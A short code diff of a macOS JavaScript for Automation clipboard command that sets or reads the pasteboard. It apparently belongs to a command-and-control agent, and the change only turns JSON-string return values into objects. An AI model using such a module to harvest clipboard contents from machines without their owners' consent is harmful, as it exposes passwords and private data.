@@ -6,10 +6,10 @@ exports.clipboard = function(task, command, params){
         try{
             $.NSPasteboard.generalPasteboard.clearContents;
             $.NSPasteboard.generalPasteboard.setStringForType($(params), $.NSPasteboardTypeString);
-            return JSON.stringify({"user_output": "Successfully set the clipboard", "completed": true});
+            return {"user_output": "Successfully set the clipboard", "completed": true};
         }
         catch(error){
-            return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
+            return {"user_output":error.toString(), "completed": true, "status": "error"};
         }
     }
     else{
@@ -19,12 +19,12 @@ exports.clipboard = function(task, command, params){
             let output = pb.stringForType($.NSPasteboardTypeString).js;
             //var output = currentApp.theClipboard();
             if(output === "" || output === undefined){
-                return JSON.stringify({"user_output":"Nothing on the clipboard", "completed": true});
+                return {"user_output":"Nothing on the clipboard", "completed": true};
             }
-            return JSON.stringify({"user_output": String(output), "completed": true});
+            return {"user_output": String(output), "completed": true};
         }
         catch(error){
-            return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
+            return {"user_output":error.toString(), "completed": true, "status": "error"};
         }
     }
 };
